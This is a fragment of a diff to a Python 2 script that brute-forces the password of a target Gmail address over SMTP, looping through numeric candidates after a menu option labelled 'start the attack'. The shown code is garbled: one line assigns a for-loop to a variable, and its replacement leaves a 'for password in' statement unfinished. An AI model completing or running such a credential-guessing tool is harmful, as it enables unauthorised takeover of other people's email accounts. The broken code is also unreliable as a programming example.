@@ -10,7 +10,7 @@ def main():
 print ("[1] start the attack")
 print ("[2] exit")
 if option == 1:
-a = for i in range(0,10):
+           for i in range(0,10):
 		 for j in range(0,10):
 		 	for k in range(0,10):
 		 		for l in range(0,10):
@@ -33,7 +33,7 @@ def login():
     user_name = raw_input('target email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
-    for password in a
+    for password in 
      i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
